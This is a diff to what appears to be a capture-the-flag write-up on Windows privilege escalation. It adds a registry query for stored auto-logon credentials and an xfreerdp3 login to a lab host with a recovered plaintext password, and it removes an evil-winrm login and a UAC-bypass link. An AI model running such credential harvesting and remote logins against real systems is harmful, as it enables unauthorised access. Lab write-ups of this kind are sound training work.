@@ -231,23 +231,19 @@ Administrator
 hugo
 ```
 
-
+Check if there are some saved credentials in the Auto logon reg keys.
 
 ```
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 ```
 
+We found hugo's credential . With this creds we can logon via RDP and run Powershell as administrator and get the root flag.
+
+```bash
+xfreerdp3 /v:10.10.26.184 /u:hugo /p:SurpriseMF123!
 ```
-evil-winrm -i 10.10.15.209 -u 'hugo' -p 'SurpriseMF123!' 
-```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 
-
-Bypass UAC to run program with Administrator privilege.
-
-Follow this page:
-
-{% content-ref url="../../../pt/executive-pt/post-exploitation/windows-post-exploitation/windows-privilege-escalation/uac-bypass.md" %}
-[uac-bypass.md](../../../pt/executive-pt/post-exploitation/windows-post-exploitation/windows-privilege-escalation/uac-bypass.md)
-{% endcontent-ref %}
 
